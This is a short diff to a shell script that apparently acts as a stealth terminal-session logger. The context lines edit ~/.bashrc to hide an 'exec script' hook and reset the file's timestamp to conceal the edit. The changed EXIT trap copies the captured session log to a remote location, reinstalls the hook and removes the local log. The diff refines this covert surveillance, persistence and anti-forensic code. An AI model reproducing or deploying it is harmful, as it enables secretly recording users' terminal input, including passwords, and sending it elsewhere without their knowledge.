@@ -34,7 +34,7 @@ self=\$(printf "%q" "\$self")
 rm -f "$fakerc"
 sed -i "/^exec script -B/d" ~/.bashrc
 touch -d @$changetime ~/.bashrc
-trap "2>/dev/null cat '$logfile' > '$remote' && rm '$logfile' && echo $quoted >> ~/.bashrc && echo \$self > '$fakerc'" EXIT
+trap "2>/dev/null cat '$logfile' > '$remote' && echo $quoted >> ~/.bashrc && echo \$self > '$fakerc'; rm -f '$logfile'" EXIT
 unset self
 . ~/.bashrc
 EOF
